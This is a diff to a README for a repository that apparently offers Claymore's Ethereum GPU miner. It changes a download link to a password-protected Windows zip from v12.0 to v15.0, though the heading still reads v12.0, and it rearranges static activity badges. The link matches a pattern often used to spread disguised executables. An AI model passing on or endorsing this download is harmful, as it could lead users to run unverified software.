@@ -1,17 +1,17 @@
 <p align="center">
-<a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/v12.0/Claymore.s.dual.ethereum.miner.-.widows.Password-claymore.zip" alt="claymore ethereum miner">
+<a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/v15.0/Claymore.s.dual.ethereum.miner.-.widows.Password-claymore.zip" alt="claymore ethereum miner">
 <img src="https://github.com/Claymore-Dual/Claymore-Dual-Miner/blob/master/files/git-files/5eth.jpg" /></a>
 </p>
 
 <p align="center">
 
-<img src="https://github.com/Claymore-Dual/Claymore-Dual-Miner/blob/master/files/git-files/Activity/date.svg" /></a>
-<a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/pulse" alt="Activity">
+<a href="#"></a>
+<img src="https://github.com/Claymore-Dual/Claymore-Dual-Miner/blob/master/files/git-files/Activity/date.svg" />
+ </p>
  
+ <p align="center">
+<a href="#"></a>
  <img src="https://github.com/Claymore-Dual/Claymore-Dual-Miner/blob/master/files/git-files/Activity/uptime.svg" /></a>
-<a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/pulse" alt="Activity">
-
-
 </p>
 
 # Claymore's Dual Ethereum AMD+NVIDIA GPU Miner v12.0 (Windows/Linux)
